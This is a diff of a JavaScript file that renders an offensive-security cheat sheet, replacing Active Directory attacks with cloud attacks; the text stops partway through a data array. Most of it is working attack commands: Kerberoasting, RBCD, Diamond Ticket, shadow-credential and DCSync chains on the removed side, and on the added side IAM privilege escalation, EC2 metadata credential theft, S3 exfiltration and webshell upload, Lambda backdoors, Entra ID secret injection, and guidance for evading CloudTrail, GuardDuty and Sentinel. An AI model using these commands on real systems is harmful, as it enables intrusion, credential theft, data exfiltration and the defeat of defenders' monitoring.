 h+='</div>';return h;
 }
 
-function fTRU(){
-var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">TRUST ATTACKS</div>';
-h+='<div class="fr">';
-h+=B("Child Domain","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Compromise child domain admin","")+F("","Get child krbtgt hash","")+F("","Know parent domain SID","")+'</div>',180);
-h+=A("forge");
-h+=B("Trust Ticket / SID History","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Golden ticket with ExtraSIDs","")+F("","Add Enterprise Admins SID to ticket","")+F("","kerberos::golden /sids:PARENT_EA_SID","")+F("","Or: inter-realm TGT with trust key","")+'</div>',240);
-h+=A("access");
-h+=B("Parent / Forest Root","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Full access to parent domain","")+F("","Enterprise Admin in forest root","")+F("","DCSync on parent DC","")+F("","Lateral to any domain in forest","")+'</div>',200);
-h+='</div>';
-h+='<div class="grd" style="margin-top:8px">';
-h+=CRD("\u{1F91D}","Trust Types","#f59e0b",
-F("","Parent-Child: automatic, bidirectional, transitive","")+F("","Tree-Root: between trees in forest","")+F("","External: non-transitive, explicit","")+F("","Forest: transitive between forests","")+F("","SID filtering: enabled on external/forest trusts",""));
-h+=CRD("\u{1F451}","Child-to-Parent Escalation","#f59e0b",
-F("","Method 1: Golden ticket + ExtraSIDs","")+F("","Add S-1-5-21-PARENT-519 (Enterprise Admins)","")+F("","Mimikatz: kerberos::golden /sids:PARENT-519","")+F("","Method 2: Inter-realm trust key","")+F("","lsadump::trust /patch (get trust key)","")+F("","kerberos::golden /rc4:TRUST_KEY /service:krbtgt /target:parent",""));
-h+=CRD("\u{1F6E1}\uFE0F","SID Filtering","#f59e0b",
-F("","Blocks extra SIDs in cross-trust tickets","")+F("","Enabled by default on external/forest trusts","")+F("","NOT enforced on intra-forest (parent-child)","")+F("","That is why child-to-parent always works","")+F("","Check: netdom trust CHILD /domain:PARENT /quarantine",""));
-h+=CRD("\u{1F30D}","Forest-to-Forest Attacks","#f59e0b",
-F("","SID filtering blocks SID history abuse","")+F("","But: if selective auth, check allowed accounts","")+F("","Kerberos delegation across forest trusts","")+F("","Shared applications/services = attack surface","")+F("","ADCS: cross-forest certificate enrollment",""));
+function fPER(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">CLOUD PERSISTENCE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F511}","AWS Persistence","#fbbf24",
+F("","Create new IAM user with access keys","")+F("","Add access key to existing user","")+F("","Backdoor role trust policy (cross-account)","")+F("","Lambda function triggered on CloudTrail events","")+F("","EC2 instance with persistent IAM role","")+F("","SSM document for persistent code execution",""));
+h+=CRD("\u{1F4AD}","Azure / Entra ID Persistence","#fbbf24",
+F("","Add secret/certificate to app registration","")+F("","Create new service principal","")+F("","Federated credential on app (no secret needed)","")+F("","Automation account runbook (scheduled)","")+F("","Azure Function with timer trigger","")+F("","Invite external B2B user (stealth admin)",""));
+h+=CRD("\u{1F7E2}","GCP Persistence","#fbbf24",
+F("","Create new service account key","")+F("","Deploy Cloud Function with timer trigger","")+F("","Add IAM binding to project/org","")+F("","Compute instance with startup script","")+F("","Custom IAM role with hidden permissions",""));
+h+=CRD("\u{1F504}","Cross-Cloud Persistence","#fbbf24",
+F("","Golden SAML: forge tokens indefinitely","")+F("","Backdoor OIDC federation trust","")+F("","Store persistence creds in other cloud","")+F("","CI/CD pipeline backdoor (GitHub Actions, etc.)","")+F("","Terraform state modification (add resources)",""));
+h+=CRD("\u{1F4E1}","Event-Triggered Persistence","#fbbf24",
+F("","AWS: CloudWatch Events -> Lambda on CreateUser","")+F("","Azure: Event Grid subscription","")+F("","GCP: Cloud Audit Log sink -> Cloud Function","")+F("","Re-create deleted backdoor automatically","")+F("","Self-healing persistence that survives cleanup",""));
+h+=CRD("\u{1F47B}","Stealth Techniques","#fbbf24",
+F("","Use existing service account (don't create new)","")+F("","Modify existing role (don't create new)","")+F("","Attach inline policy (harder to find than managed)","")+F("","Short descriptions matching legitimate resources","")+F("","Tag resources to blend with existing infra",""));
 h+='</div>';return h;
 }
 
 function fKIT(){
-var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">BLOODHOUND QUERIES & CHEAT SHEET</div>';
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">CLOUD SECURITY TOOLS</div>';
 h+='<div class="grd" style="margin-bottom:10px">';
-var queries=[
-{n:"Shortest Path to DA",q:"MATCH p=shortestPath((n)-[r*1..]->(m:Group)) WHERE m.name STARTS WITH 'DOMAIN ADMINS' RETURN p",c:"#f87171"},
-{n:"Kerberoastable Admins",q:"MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {admincount:true}) RETURN u.name",c:"#fbbf24"},
-{n:"AS-REP Roastable",q:"MATCH (u:User {dontreqpreauth:true}) RETURN u.name",c:"#fbbf24"},
-{n:"Unconstrained Delegation",q:"MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name",c:"#34d399"},
-{n:"Users with DCSync Rights",q:"MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p",c:"#a78bfa"},
-{n:"GPO -> Computer Paths",q:"MATCH p=(g:GPO)-[:GpLink|Contains*1..]->(c:Computer) RETURN p",c:"#34d399"},
-{n:"Owned to DA Path",q:"MATCH p=shortestPath((n {owned:true})-[r*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p",c:"#f87171"},
-{n:"Shadow Admin Paths",q:"MATCH p=(n)-[:GenericAll|WriteDacl|WriteOwner|ForceChangePassword*1..]->(m:User {admincount:true}) RETURN p",c:"#e879f9"}
-];
-queries.forEach(function(x){
-h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+x.c+';font-size:.72em">'+x.n+'</div><div style="font-size:.6em;color:#9ca3af;margin-top:2px;font-family:monospace;word-break:break-all">'+x.q+'</div></div>';
-});
-h+='</div>';
-h+=N("ATTACK PRIORITY","#f472b6","<b>Phase 1:</b> Enumerate (BloodHound + PowerView) \u2192 <b>Phase 2:</b> Kerberoast / AS-REP roast (no privs needed) \u2192 <b>Phase 3:</b> ACL abuse paths from BloodHound \u2192 <b>Phase 4:</b> ADCS misconfigs \u2192 <b>Phase 5:</b> Delegation abuse \u2192 <b>Phase 6:</b> DCSync / Golden Ticket");
-h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin:10px 0 6px">ESSENTIAL TOOLS</div>';
-h+='<div class="grd">';
 var tools=[
-{n:"Rubeus",d:"Kerberos attacks: roasting, ticket manipulation, delegation abuse, diamond tickets",c:"#fbbf24"},
-{n:"Certify / Certipy",d:"ADCS enumeration and exploitation. find /vulnerable for quick wins.",c:"#e879f9"},
-{n:"PowerView",d:"AD enumeration: users, groups, ACLs, trusts, shares, GPOs. The Swiss army knife.",c:"#60a5fa"},
-{n:"Mimikatz",d:"Credential extraction, ticket forging, DCSync, DPAPI, trust key extraction.",c:"#f87171"},
-{n:"BloodHound",d:"Graph-based AD attack path analysis. Ingest SharpHound data.",c:"#34d399"},
-{n:"Impacket",d:"Python toolkit: secretsdump, GetUserSPNs, ntlmrelayx, getST, wmiexec, etc.",c:"#a78bfa"}
+{n:"Pacu",d:"AWS exploitation framework. Modules for enumeration, privesc, persistence, exfil. pacu > run iam__enum_permissions.",c:"#f59e0b",r:"AWS"},
+{n:"Prowler",d:"AWS/Azure/GCP security assessment. CIS benchmark checks. prowler aws / prowler azure.",c:"#60a5fa",r:"Multi"},
+{n:"ScoutSuite",d:"Multi-cloud security auditing. Web report. scout --provider aws --profile stolen.",c:"#34d399",r:"Multi"},
+{n:"ROADtools",d:"Azure AD enumeration + exploitation. roadrecon gather -> roadrecon gui. Full tenant dump.",c:"#60a5fa",r:"Azure"},
+{n:"AADInternals",d:"Azure AD / M365 PowerShell toolkit. Golden SAML, token manipulation, tenant recon.",c:"#a78bfa",r:"Azure"},
+{n:"enumerate-iam",d:"Brute-force AWS permissions. Tests every API call. Shows what stolen keys can do.",c:"#f59e0b",r:"AWS"},
+{n:"Cloudfox",d:"AWS/Azure/GCP attack surface enumeration. cloudfox aws all-checks.",c:"#34d399",r:"Multi"},
+{n:"GraphRunner",d:"Microsoft Graph API exploitation. Enum users, mail, SharePoint, Teams.",c:"#60a5fa",r:"Azure"},
+{n:"GCPBucketBrute",d:"GCP bucket enumeration and permission testing. Finds public/accessible buckets.",c:"#34d399",r:"GCP"},
+{n:"cf-domain-takeover",d:"Check for dangling DNS pointing to unclaimed cloud resources (S3, Azure, etc.).",c:"#f87171",r:"Multi"}
 ];
-tools.forEach(function(t){
-h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+t.c+';font-size:.72em">'+t.n+'</div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';
+tools.forEach(function(x){
+h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+x.c+';font-size:.76em">'+x.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+x.r+'</span></div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+x.d+'</div></div>';
 });
 h+='</div>';
+h+=N("ENUMERATION ORDER","#f472b6","<b>1.</b> sts get-caller-identity / az account show <b>2.</b> Enumerate permissions (enumerate-iam/Pacu) <b>3.</b> Check metadata service <b>4.</b> List storage/secrets <b>5.</b> Map IAM roles/policies <b>6.</b> Find privesc paths <b>7.</b> Check federation/trusts");
 return h;
 }
 
 function fBYP(){
 var h='<div class="grd">';
-h+=CRD("\u{1F6E1}\uFE0F","Protected Users Group","#fb923c",
-F("","Members: no NTLM auth, no delegation, no caching","")+F("","TGT lifetime: 4 hours (not 10)","")+F("","No DES or RC4 in Kerberos","")+F("","Bypass: Kerberoast still works if SPN set","")+F("","Bypass: ADCS cert-based auth unaffected","")+F("","Bypass: already-cached tickets still usable",""));
-h+=CRD("\u{1F512}","LAPS / Windows LAPS","#fb923c",
-F("","Randomizes local admin password per machine","")+F("","Stored in AD: ms-Mcs-AdmPwd (legacy)","")+F("","Windows LAPS: msLAPS-Password (encrypted)","")+F("","Bypass: read attribute if you have access","")+F("","Bypass: legacy LAPS password in cleartext in AD","")+F("","Enumerate readers: Get-DomainObjectAcl on computers",""));
-h+=CRD("\u{1F510}","Credential Guard","#fb923c",
-F("","VBS isolates LSASS secrets","")+F("","NTLM hashes not extractable from LSASS","")+F("","Bypass: DCSync still works (replication, not memory)","")+F("","Bypass: Kerberos tickets still in memory","")+F("","Bypass: DPAPI keys accessible","")+F("","Bypass: Shadow credentials + PKINIT",""));
-h+=CRD("\u{1F3D7}\uFE0F","Tiered Admin Model","#fb923c",
-F("","Tier 0: DCs, ADCS, privileged groups","")+F("","Tier 1: Servers, applications","")+F("","Tier 2: Workstations, end users","")+F("","Tier 0 accounts only log into Tier 0","")+F("","Bypass: find Tier 0 creds cached on Tier 1/2","")+F("","Bypass: ACL paths that cross tier boundaries",""));
-h+=CRD("\u{1F50D}","Detection Evasion","#fb923c",
-F("","Kerberoast: use AES not RC4 (less anomalous)","")+F("","DCSync: normal replication traffic on wire","")+F("","BloodHound: use LDAP(S) not SharpHound for stealth","")+F("","BOF over inline-execute vs PowerShell","")+F("","Avoid net.exe / nltest.exe (command-line logging)","")+F("","Use .NET or WMI for enumeration instead",""));
-h+=CRD("\u{1F4CA}","Monitoring Awareness","#fb923c",
-F("","4769: TGS request (Kerberoasting detection)","")+F("","4662: DCSync (DS-Replication-Get-Changes)","")+F("","4768: TGT request (AS-REP roasting)","")+F("","4724: password reset (ForceChangePassword)","")+F("","5136: directory object modified (ACL changes)","")+F("","4720/4728: account/group creation",""));
+h+=CRD("\u{1F6E1}\uFE0F","CloudTrail Evasion (AWS)","#fb923c",
+F("","Data events (S3 GetObject) not logged by default","")+F("","Some API calls not in CloudTrail at all","")+F("","Use read-only calls for recon (lower alert priority)","")+F("","Regions without CloudTrail configured","")+F("","Delete/stop trail (if you have permissions)","")+F("","Event selectors may exclude specific events",""));
+h+=CRD("\u{1F4CA}","GuardDuty Evasion (AWS)","#fb923c",
+F("","Avoid known GuardDuty finding types","")+F("","Reconnaissance from same VPC (internal, not flagged)","")+F("","Use existing IAM entities (not new ones)","")+F("","Slow enumeration (avoid rate-based detections)","")+F("","GuardDuty doesn't cover all API calls","")+F("","Disable GuardDuty (if admin, noisy but effective)",""));
+h+=CRD("\u{1F50D}","Azure Sentinel / Defender Evasion","#fb923c",
+F("","Sentinel relies on Log Analytics workspace data","")+F("","Not all logs ingested (cost-based decisions)","")+F("","Use Azure CLI instead of Portal (different logging)","")+F("","Graph API calls may have less monitoring","")+F("","Conditional Access: comply with policy to avoid flags",""));
+h+=CRD("\u{1F512}","SCP / Permission Boundary Bypass","#fb923c",
+F("","SCPs apply to member accounts, not management account","")+F("","Permission boundaries limit max permissions","")+F("","Neither restrict the root user of management account","")+F("","Resource-based policies can bypass boundaries","")+F("","SCP doesn't prevent sts:AssumeRole to unrestricted role",""));
+h+=CRD("\u{1F4E1}","IMDSv2 Bypass","#fb923c",
+F("","IMDSv2 requires PUT for token, then GET with token","")+F("","Blocks simple SSRF (GET-only)","")+F("","Bypass: if SSRF allows PUT requests","")+F("","Bypass: if application proxies arbitrary HTTP methods","")+F("","Some services still allow IMDSv1 fallback",""));
+h+=CRD("\u{1F47B}","Assume Role Logging Gaps","#fb923c",
+F("","AssumeRole logged in source and target account","")+F("","But: user-agent / IP may not be monitored","")+F("","Cross-account assumed role: target sees source account ID","")+F("","Session names can be arbitrary (blend in)","")+F("","Use legitimate session name patterns",""));
 h+='</div>';return h;
 }
 function getCodes(s){
 var C={};
-C.enu=[
-{t:"SharpHound collection",l:"c#",c:"// SharpHound - BloodHound data collector\n// Full collection:\nSharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\Temp\\\n\n// Stealth collection (LDAP only, no SMB):\nSharpHound.exe -c DCOnly\n\n// Specific collection methods:\nSharpHound.exe -c Session,ACL,Trust,Container,ObjectProps\n\n// Loop session collection (catch transient sessions):\nSharpHound.exe -c Session --loop --loopduration 02:00:00\n\n// Exclude DCs (reduce noise):\nSharpHound.exe -c All --excludedcs\n\n// BOF alternative (in-memory, CobaltStrike):\n// InlineExecute-Assembly --dotnetassembly SharpHound.exe\n//   --assemblyargs \"-c All\"\n\n// Output: YYYYMMDDHHMMSS_BloodHound.zip\n// Import: BloodHound UI -> Upload Data"},
-{t:"PowerView essential commands",l:"ps",c:"# Import\nImport-Module .\\PowerView.ps1\n\n# Domain info\nGet-Domain\nGet-DomainController\nGet-DomainPolicy\n\n# Users\nGet-DomainUser -SPN              # Kerberoastable\nGet-DomainUser -PreauthNotRequired # AS-REP roastable\nGet-DomainUser -AdminCount        # Admin accounts\n\n# Groups\nGet-DomainGroup -AdminCount\nGet-DomainGroupMember 'Domain Admins' -Recurse\n\n# Computers\nGet-DomainComputer -Unconstrained\nGet-DomainComputer -TrustedToAuth  # Constrained deleg\nGet-DomainComputer -LAPS           # LAPS enabled\n\n# ACLs (critical for attack paths)\nGet-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner' }\n\n# Shares\nFind-DomainShare -CheckShareAccess\n\n# GPO\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'Write' }"},
-{t:"LDAP enumeration (no tools)",l:"ps",c:"# Pure LDAP queries - no PowerView needed\n$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$dc = $domain.FindDomainController()\n$ldap = \"LDAP://$($dc.Name)\"\n$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ldap)\n\n# Kerberoastable users\n$searcher.Filter = '(&(objectClass=user)(servicePrincipalName=*))'\n$searcher.FindAll() | % { $_.Properties['samaccountname'] }\n\n# AS-REP roastable\n$searcher.Filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'\n$searcher.FindAll() | % { $_.Properties['samaccountname'] }\n\n# Unconstrained delegation (computers)\n$searcher.Filter = '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'\n$searcher.FindAll() | % { $_.Properties['dnshostname'] }\n\n# AdminCount=1 (privileged accounts)\n$searcher.Filter = '(&(objectClass=user)(adminCount=1))'\n$searcher.FindAll() | % { $_.Properties['samaccountname'] }"}
+C.aim=[
+{t:"AWS IAM privilege escalation: CreatePolicyVersion",l:"aws",c:"# Check current permissions:\naws iam list-attached-user-policies --user-name compromised-user\naws iam list-user-policies --user-name compromised-user\n\n# If we have iam:CreatePolicyVersion on a managed policy:\n# Create new permissive policy version and set as default\naws iam create-policy-version \\\n    --policy-arn arn:aws:iam::123456789:policy/OurPolicy \\\n    --policy-document '{\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [{\n            \"Effect\": \"Allow\",\n            \"Action\": \"*\",\n            \"Resource\": \"*\"\n        }]\n    }' \\\n    --set-as-default\n\n# Now we have admin access via the modified policy\n# Verify:\naws sts get-caller-identity\naws iam list-users\naws s3 ls\n\n# Other privesc paths:\n# iam:AttachUserPolicy -> attach AdministratorAccess\naws iam attach-user-policy --user-name compromised \\\n    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# iam:CreateAccessKey -> key for any user\naws iam create-access-key --user-name admin-user"},
+{t:"Enumerate permissions with Pacu",l:"aws",c:"# Install and configure Pacu\npip3 install pacu\npacu\n\n# Import stolen keys\nPacu > import_keys stolen-key\n# Enter: Access Key ID, Secret Access Key, (Session Token)\n\n# Enumerate permissions\nPacu > run iam__enum_permissions\n# Tests API calls to determine what you can do\n\n# Enumerate everything reachable\nPacu > run iam__enum_users_roles_policies_groups\nPacu > run ec2__enum\nPacu > run s3__enum\nPacu > run lambda__enum\n\n# Check for privesc paths\nPacu > run iam__privesc_scan\n# Reports exploitable IAM misconfigurations\n\n# Exploit privesc\nPacu > run iam__privesc_scan --exploit\n\n# Persistence\nPacu > run iam__backdoor_users_keys\nPacu > run iam__backdoor_assume_role"},
+{t:"Cross-account role assumption",l:"aws",c:"# Discover assumable roles:\naws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}'\n\n# Check trust policy for overly permissive:\n# \"Principal\": {\"AWS\": \"*\"}  <- ANY account can assume!\n# \"Principal\": {\"AWS\": \"arn:aws:iam::123456:root\"} <- specific account\n\n# Assume the role:\naws sts assume-role \\\n    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/OverlyPermissiveRole \\\n    --role-session-name attacker-session\n\n# Returns: AccessKeyId, SecretAccessKey, SessionToken\n# Export and use:\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\n\n# Verify new identity:\naws sts get-caller-identity\n# Should show TARGET_ACCOUNT and assumed role\n\n# Chain: Role A -> Role B -> Role C\n# Each hop may grant additional permissions"}
 ];
-C.krb=[
-{t:"Kerberoasting with Rubeus",l:"c#",c:"// All SPN accounts:\nRubeus.exe kerberoast /outfile:hashes.txt\n\n// Targeted (single high-value account):\nRubeus.exe kerberoast /user:sqlsvc /outfile:hashes.txt\n\n// AES encryption (stealthier, harder to crack):\nRubeus.exe kerberoast /enctype:aes256 /outfile:hashes.txt\n\n// From Linux (Impacket):\nGetUserSPNs.py -request -dc-ip DC_IP corp.local/user:password\nGetUserSPNs.py -request -hashes :NTLM corp.local/user\n\n// Crack with hashcat:\nhashcat -m 13100 hashes.txt wordlist.txt  # RC4\nhashcat -m 19700 hashes.txt wordlist.txt  # AES256\n\n// Targeted Kerberoast (set SPN then roast):\n// If you have GenericAll/GenericWrite on user:\nSet-DomainObject -Identity target -SET @{servicePrincipalName='http/attacker'}\nRubeus.exe kerberoast /user:target\n// Clean up:\nSet-DomainObject -Identity target -Clear servicePrincipalName"},
-{t:"Delegation abuse (RBCD)",l:"c#",c:"// Resource-Based Constrained Delegation\n// Requirement: Write access to target computer object\n\n// Step 1: Create or control a computer account\n// New machine account (if MachineAccountQuota > 0):\nImpacket: addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass\n// Or: PowerMad: New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'P@ss' -AsPlainText -Force)\n\n// Step 2: Set RBCD on target computer\n// PowerView:\n$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-EVIL_SID)'\n$sdBytes = New-Object byte[] ($sd.BinaryLength)\n$sd.GetBinaryForm($sdBytes, 0)\nSet-DomainObject TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}\n\n// Or Impacket:\nrbcd.py -delegate-to TARGET$ -delegate-from EVIL$ -action write corp.local/user:pass\n\n// Step 3: Get service ticket via S4U\ngetST.py -spn cifs/TARGET.corp.local -impersonate Administrator -dc-ip DC corp.local/EVIL$:P@ss\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.local/Administrator@TARGET"},
-{t:"Diamond Ticket (stealthier than Golden)",l:"c#",c:"// Diamond Ticket: decrypt real TGT, modify PAC, re-encrypt\n// Requires krbtgt keys (AES256 preferred)\n\n// Rubeus:\nRubeus.exe diamond /krbkey:AES256_KEY /user:admin /domain:corp.local /dc:DC01 /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt\n\n// Why better than Golden:\n// - Based on real TGT (has valid timestamps)\n// - PAC is modified, not forged from scratch\n// - Passes PAC validation checks\n// - Encrypted with AES256 (not RC4)\n// - Much harder to detect\n\n// Sapphire Ticket (even stealthier):\n// Uses S4U2Self to get legitimate PAC from DC\n// Then injects it into forged ticket\nRubeus.exe diamond /krbkey:AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt /tgtdeleg\n\n// Detection: nearly impossible without\n// comparing ticket fields to DC-issued originals"}
+C.aws=[
+{t:"EC2 metadata credential theft (SSRF)",l:"aws",c:"# IMDSv1 (simple GET - older instances):\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Returns role name, then:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n# Returns: AccessKeyId, SecretAccessKey, Token, Expiration\n\n# IMDSv2 (token-based - newer instances):\nTOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token \\\n    -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n\n# Other useful metadata:\ncurl .../latest/meta-data/hostname\ncurl .../latest/meta-data/local-ipv4\ncurl .../latest/user-data  # startup scripts may contain secrets!\ncurl .../latest/meta-data/iam/info  # instance profile ARN\n\n# Use stolen creds from attacker machine:\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws sts get-caller-identity"},
+{t:"S3 bucket enumeration and exfil",l:"aws",c:"# Check for public access:\naws s3 ls s3://target-bucket --no-sign-request\n\n# Authenticated access (any AWS account if ACL misconfigured):\naws s3 ls s3://target-bucket --profile any-aws-account\n\n# Download everything:\naws s3 sync s3://target-bucket ./exfil/ --no-sign-request\n\n# Check bucket policy:\naws s3api get-bucket-policy --bucket target-bucket\n\n# Check ACL:\naws s3api get-bucket-acl --bucket target-bucket\n# Dangerous: \"AllUsers\" or \"AuthenticatedUsers\" grantee\n\n# Upload if writable (webshell, backdoor):\naws s3 cp shell.php s3://target-bucket/shell.php\n\n# Bucket discovery:\n# Wordlist: company-backup, company-data, company-dev\n# Tools: cloud_enum, S3Scanner, bucket_finder\n\n# Secrets in buckets:\n# .env files, .git directories, terraform.tfstate\n# Database backups, SSH keys, API credentials"},
+{t:"Lambda function code and env extraction",l:"aws",c:"# List Lambda functions:\naws lambda list-functions --region us-east-1\n\n# Get function configuration (includes env vars!):\naws lambda get-function-configuration --function-name target-fn\n# Environment.Variables may contain:\n# DB_PASSWORD, API_KEY, SECRET_KEY, etc.\n\n# Download function code:\naws lambda get-function --function-name target-fn\n# Returns: Code.Location = pre-signed S3 URL\n# Download and extract the ZIP\n\n# Get execution role:\naws lambda get-function-configuration --function-name target-fn \\\n    --query 'Role'\n# Then enumerate that role's permissions\naws iam list-attached-role-policies --role-name lambda-role\n\n# Invoke function (if authorized):\naws lambda invoke --function-name target-fn \\\n    --payload '{\"cmd\":\"id\"}' output.json\n\n# Modify function code (persistence):\naws lambda update-function-code --function-name target-fn \\\n    --zip-file fileb://backdoor.zip"}
 ];
-C.acl=[
-{t:"ACL abuse chain: WriteDACL to DA",l:"ps",c:"# Step 1: Find WriteDACL on domain object\nGet-DomainObjectAcl 'DC=corp,DC=local' -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'WriteDacl' -and\n      $_.SecurityIdentifier -match 'S-1-5-21-.*-OUR_SID' }\n\n# Step 2: Grant ourselves DCSync rights\nAdd-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \\\n  -PrincipalIdentity attacker \\\n  -Rights DCSync\n\n# Step 3: DCSync\nmimikatz # lsadump::dcsync /user:corp\\krbtgt\n\n# Alternative chain: GenericAll on user\n# Option A: Reset password\nnet user target NewP@ss123 /domain\n\n# Option B: Set SPN then Kerberoast\nSet-DomainObject target -SET @{servicePrincipalName='x/x'}\nRubeus.exe kerberoast /user:target\n\n# Option C: Shadow Credentials\nWhisker.exe add /target:target /domain:corp.local\nRubeus.exe asktgt /user:target /certificate:cert.pfx /password:pass /ptt\n\n# Clean up ACL changes after:\nRemove-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \\\n  -PrincipalIdentity attacker -Rights DCSync"},
-{t:"Shadow Credentials attack",l:"c#",c:"// Write msDS-KeyCredentialLink on target\n// Requires: GenericAll, GenericWrite, or WriteProperty\n//   on msDS-KeyCredentialLink attribute\n\n// Step 1: Add shadow credential\nWhisker.exe add /target:DC01$ /domain:corp.local\n// Output: certificate + password for PKINIT\n\n// Step 2: Request TGT using certificate\nRubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /password:randompass /domain:corp.local /dc:DC01 /ptt\n\n// Step 3: DCSync (if target is DC machine account)\nmimikatz # lsadump::dcsync /user:corp\\krbtgt\n\n// Or from Linux:\n// pywhisker -d corp.local -u user -p pass --target DC01$ --action add\n// Then:\n// certipy auth -pfx DC01$.pfx -dc-ip DC_IP\n\n// Advantages:\n// - No password change (user doesn't notice)\n// - Survives password rotation\n// - Key stored as DN-Binary in AD attribute\n// - Can add multiple keys\n\n// Clean up:\nWhisker.exe remove /target:DC01$ /deviceid:GUID"}
+C.eid=[
+{t:"Entra ID enumeration with ROADtools",l:"az",c:"# Install ROADtools\npip install roadtools\n\n# Authenticate:\nroadrecon auth -u user@corp.onmicrosoft.com -p password\n# Or with access token:\nroadrecon auth --access-token eyJ0...\n\n# Gather all tenant data:\nroadrecon gather\n# Downloads: users, groups, apps, service principals, roles, etc.\n\n# Launch GUI:\nroadrecon gui\n# Browse at http://localhost:5000\n\n# Key things to look for:\n# - App registrations with high permissions\n# - Service principals with secrets\n# - Users with Global Admin or other privileged roles\n# - Conditional Access policy gaps\n# - Guest users with elevated access\n\n# Alternative: AzureHound (BloodHound for Azure)\n# azurehound -u user@corp.com -p pass -t corp.onmicrosoft.com\n# Import JSON into BloodHound CE"},
+{t:"App registration secret injection",l:"az",c:"# Find app registrations we can modify:\naz ad app list --query \"[].{name:displayName, appId:appId, owners:owners}\"\n\n# If we own or have write access to an app:\n# Add new client secret:\naz ad app credential reset --id APP_ID --append\n# Returns: new secret value\n\n# Now authenticate as the application:\naz login --service-principal \\\n    --username APP_ID \\\n    --password NEW_SECRET \\\n    --tenant TENANT_ID\n\n# Check app's permissions:\naz ad app permission list --id APP_ID\n# Application permissions (not delegated) don't need user consent\n# Examples: Mail.ReadWrite.All, User.ReadWrite.All, Directory.ReadWrite.All\n\n# Use Graph API with app permissions:\naz rest --method GET \\\n    --url 'https://graph.microsoft.com/v1.0/users' \\\n    --headers 'Content-Type=application/json'\n\n# Read any user's email:\naz rest --method GET \\\n    --url 'https://graph.microsoft.com/v1.0/users/TARGET/messages'"}
 ];
-C.crd=[
